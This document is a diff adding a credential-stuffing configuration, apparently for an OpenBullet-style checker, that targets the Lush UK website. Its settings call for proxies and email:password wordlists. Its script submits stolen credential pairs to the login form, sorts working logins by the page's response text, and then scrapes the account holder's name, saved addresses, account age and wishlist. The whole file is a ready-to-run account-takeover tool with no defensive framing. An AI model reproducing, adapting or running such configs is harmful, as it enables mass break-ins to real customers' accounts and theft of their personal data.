@@ -1,0 +1,63 @@
+[SETTINGS]
+{
+  "Name": "Lush || V0RT3X",
+  "SuggestedBots": 50,
+  "LastModified": "2019-04-03T12:23:18.1674912+01:00",
+  "AdditionalInfo": "",
+  "Author": "V0RT3X",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://uk.lush.com/user/login?destination=" 
+  CONTENT "name=<USER>&form_build_id=form-vAu6UP5Jm6s5dNkSspzVjdfsDS1M3Ji_8Dj5E_2MhqQ&form_id=user_login&pass=<PASS>&op=CONTINUE" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" 
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Good try, but not quite right. Your username or password is unrecognised" 
+  KEYCHAIN Success OR 
+    KEY "<div class=\"sitewide_header_user_name\">" 
+REQUEST GET "https://uk.lush.com/my-account" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+PARSE "<SOURCE>" LR "<span class=\"first-name\">" "</span>" -> CAP "Firstname" 
+PARSE "<SOURCE>" LR "<span class=\"surname\">" "</span>" -> CAP "Lastname" 
+REQUEST GET "https://uk.lush.com/my-account/addressbook" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+PARSE "<SOURCE>" LR "<div class=\"icon object-account-top-large-icon icon-home\"></div>" " </div>" -> CAP "Addresses" 
+REQUEST GET "https://uk.lush.com/my-account/order-history" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+PARSE "<SOURCE>" LR "<div class=\"object-account-top-large size-2 break-2-size-4 break-4-size-4 bold colour-white\">" " </div>" -> CAP "Days Joined" 
+REQUEST GET "https://uk.lush.com/my-account/wishlist" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+PARSE "<SOURCE>" LR "<div class=\"icon object-account-top-large-icon icon-heart\"></div>" " </div>" -> CAP "Wishlist" 
